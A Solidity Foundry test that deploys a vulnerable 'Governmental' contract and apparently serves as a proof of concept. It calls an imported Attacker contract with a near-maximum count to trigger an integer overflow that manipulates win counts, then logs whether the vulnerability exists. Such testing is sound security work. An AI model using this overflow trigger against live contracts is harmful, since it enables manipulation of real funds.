// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";
import "../src/governmental_survey.sol";

contract GovernmentalSurveyOverflowTest is Test {
    Governmental public gov;
    Attacker public attacker;
    
    function setUp() public payable {
        // Deploy Governmental contract with 1 ether required by constructor
        gov = new Governmental{value: 1 ether}();
        attacker = new Attacker();
    }

    function testAttackCountOverflow() public {
        // Simulate investment to prepare a valid resetInvestment() state
        vm.warp(block.timestamp + 61 seconds); // Ensure timestamp condition
        
        // BEFORE STATE CAPTURE
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 totalWinnersBefore = gov.totalWinners();
        uint256 zeroWinsBefore = gov.investorWins(address(0));
        uint256 govBalanceBefore = address(gov).balance;
        
        console2.log("Initial totalWinners: ", totalWinnersBefore);
        console2.log("Address(0) wins:      ", zeroWinsBefore);
        console2.log("Contract balance:     ", govBalanceBefore);

        console2.log("--- Trigger Attack ---");
        // Trigger attack with count value set to cause overflow
        uint256 overflowCount = type(uint256).max - 1022;
        attacker.attack(address(gov), overflowCount);

        // AFTER STATE CAPTURE
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 totalWinnersAfter = gov.totalWinners();
        uint256 zeroWinsAfter = gov.investorWins(address(0));
        uint256 govBalanceAfter = address(gov).balance;
        
        console2.log("Updated totalWinners: ", totalWinnersAfter);
        console2.log("Address(0) wins:      ", zeroWinsAfter);
        console2.log("Contract balance:     ", govBalanceAfter);

        // DIFFERENTIAL VERIFICATION
        console2.log("--- Verification ---");
        bool winnersIncreased = totalWinnersAfter > totalWinnersBefore;
        bool zeroWinsIncreased = zeroWinsAfter > zeroWinsBefore;
        bool balanceChanged = govBalanceAfter != govBalanceBefore;
        
        console2.log("Total winners increased: %s", winnersIncreased ? "YES" : "NO");
        console2.log("Address(0) wins increased: %s", zeroWinsIncreased ? "YES" : "NO");
        console2.log("Contract balance changed: %s", balanceChanged ? "YES" : "NO");

        // FINAL VERDICT
        if(winnersIncreased && zeroWinsIncreased) {
            console2.log("Vulnerability Exists: Win counts successfully manipulated via overflow exploit");
        } else {
            console2.log("Vulnerability not Exist: Win counts unchanged after overflow attempt");
        }
    }
}